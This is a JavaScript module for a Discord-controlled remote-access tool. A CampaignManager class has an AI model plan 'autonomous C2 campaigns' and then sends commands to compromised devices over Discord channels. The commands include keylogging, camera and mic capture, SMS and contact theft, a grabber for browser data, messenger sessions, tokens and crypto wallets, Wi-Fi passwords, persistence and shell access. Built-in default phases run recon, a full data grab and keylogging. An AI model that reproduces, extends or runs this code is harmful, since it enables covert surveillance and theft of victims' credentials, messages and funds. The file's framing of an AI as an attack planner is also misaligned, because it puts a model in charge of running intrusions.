import crypto from 'crypto'
import { aiContext } from './context.js'
import { aiCoPilot } from './index.js'

class CampaignManager {
  constructor() {
    this.campaigns = new Map()
  }

  _key(guildId, userId) {
    return `${guildId}:${userId}`
  }

  _cid() {
    return crypto.randomBytes(6).toString('hex')
  }

  createCampaign(guildId, userId, objective) {
    const id = this._cid()
    const campaign = {
      id,
      guildId,
      userId,
      objective,
      status: 'planned',
      phases: [],
      currentPhaseIndex: 0,
      progress: '0%',
      elapsed: '0s',
      dataCollected: {},
      createdAt: Date.now(),
      startedAt: null,
      completedAt: null,
      errorCount: 0,
      maxErrors: 3,
    }
    const k = this._key(guildId, userId)
    if (!this.campaigns.has(k)) this.campaigns.set(k, [])
    this.campaigns.get(k).push(campaign)
    return campaign
  }

  async planCampaign(campaign, deviceContext) {
    const session = aiContext.getSession(campaign.guildId, campaign.userId)
    const prompt = `You are an autonomous C2 campaign planner. Given the objective "${campaign.objective}" and device context:\n${deviceContext}\n\nCreate a multi-phase operation plan. For each phase, list commands to execute on the target device. Available commands: info, ping, screenshot, camera, mic, location, contacts, sms, call_log, clipboard, keylog, wifi, battery, processes, installed, notifications, shell, grabber (all/browser/messenger/tokens/wallets/files/clipboard), wifipass, netstat, persist, upload, target <device-channel-name>.\n\nRespond in JSON format:\n{\n  "analysis": "strategic assessment",\n  "phases": [\n    {\n      "name": "Phase name",\n      "description": "what this phase does",\n      "commands": [{"command": "cmd", "args": "", "reason": "why"}],\n      "requiresApproval": true/false,\n      "expectedDuration": "X minutes"\n    }\n  ],\n  "estimatedDuration": "total time",\n  "riskLevel": "low/medium/high",\n  "warning": "any warnings"\n}`
    try {
      const res = await aiCoPilot._callGemini(prompt, session)
      let json
      try {
        json = JSON.parse(res.replace(/```json\s*/gi, '').replace(/```\s*$/gm, '').trim())
      } catch {
        json = { analysis: 'AI planning completed', phases: this._defaultPhases(campaign), estimatedDuration: 'unknown', riskLevel: 'medium', warning: 'Fallback plan used' }
      }
      campaign.phases = json.phases || this._defaultPhases(campaign)
      campaign.planAnalysis = json.analysis || ''
      return json
    } catch (err) {
      campaign.phases = this._defaultPhases(campaign)
      return { analysis: 'AI unavailable, using default recon plan', phases: campaign.phases, estimatedDuration: '5 min', riskLevel: 'low', warning: err.message }
    }
  }

  _defaultPhases(campaign) {
    return [
      { name: 'Initial Recon', description: 'Basic device info', commands: [{ command: 'info', args: '', reason: 'Get device info' }, { command: 'ping', args: '', reason: 'Check connectivity' }], requiresApproval: false, expectedDuration: '30s' },
      { name: 'Data Gathering', description: 'Collect device data', commands: [{ command: 'grabber', args: 'all', reason: 'Full data grab' }, { command: 'clipboard', args: '', reason: 'Check clipboard' }], requiresApproval: true, expectedDuration: '2 min' },
      { name: 'Surveillance', description: 'Enable monitoring', commands: [{ command: 'keylog', args: 'on', reason: 'Start keylogging' }, { command: 'location', args: '', reason: 'Get location' }], requiresApproval: true, expectedDuration: '1 min' },
    ]
  }

  getCampaign(guildId, userId, campaignId) {
    const k = this._key(guildId, userId)
    const list = this.campaigns.get(k) || []
    return list.find(c => c.id === campaignId)
  }

  cancelCampaign(guildId, userId, campaignId) {
    const k = this._key(guildId, userId)
    const list = this.campaigns.get(k) || []
    const idx = list.findIndex(c => c.id === campaignId)
    if (idx === -1) return false
    list[idx].status = 'aborted'
    return true
  }

  listCampaigns(guildId, userId) {
    const k = this._key(guildId, userId)
    return this.campaigns.get(k) || []
  }

  async executePhase(campaign, guild, client) {
    if (campaign.status === 'aborted') return { phase: 'cancelled', status: 'aborted', message: 'Campaign aborted' }
    if (campaign.currentPhaseIndex >= campaign.phases.length) {
      campaign.status = 'completed'
      campaign.completedAt = Date.now()
      return { phase: 'done', status: 'completed', message: 'All phases complete' }
    }
    if (!campaign.startedAt) campaign.startedAt = Date.now()
    campaign.status = 'running'
    const phase = campaign.phases[campaign.currentPhaseIndex]
    const results = []
    for (const cmd of phase.commands) {
      try {
        const ch = guild.channels.cache.find(c => c.name && c.name.startsWith('device-'))
        if (ch) {
          await ch.send(`!${cmd.command}${cmd.args ? ' ' + cmd.args : ''}`)
          results.push(`Sent !${cmd.command}`)
        }
      } catch (err) {
        results.push(`Failed !${cmd.command}: ${err.message}`)
        campaign.errorCount++
      }
    }
    campaign.currentPhaseIndex++
    campaign.progress = `${Math.round((campaign.currentPhaseIndex / campaign.phases.length) * 100)}%`
    const elapsed = Math.round((Date.now() - campaign.startedAt) / 1000)
    campaign.elapsed = `${elapsed}s`
    const status = campaign.errorCount >= campaign.maxErrors ? 'failed' : campaign.currentPhaseIndex >= campaign.phases.length ? 'completed' : 'running'
    if (status !== 'running') campaign.status = status
    if (status === 'completed') campaign.completedAt = Date.now()
    return { phase: phase.name, status, message: results.join('\n') }
  }

  async generateReport(campaign) {
    const keyFindings = []
    const recommendations = []
    if (campaign.dataCollected && Object.keys(campaign.dataCollected).length) {
      keyFindings.push(`Collected data from ${Object.keys(campaign.dataCollected).length} sources`)
    }
    keyFindings.push(`Completed ${campaign.currentPhaseIndex}/${campaign.phases.length} phases`)
    keyFindings.push(`Duration: ${campaign.elapsed}`)
    recommendations.push('Review collected data for actionable intelligence')
    recommendations.push('Consider running grabber all for comprehensive data extraction')
    recommendations.push('Enable keylog for persistent monitoring if needed')
    return { keyFindings, recommendations, dataCollected: campaign.dataCollected || {} }
  }
}

export const campaignManager = new CampaignManager()
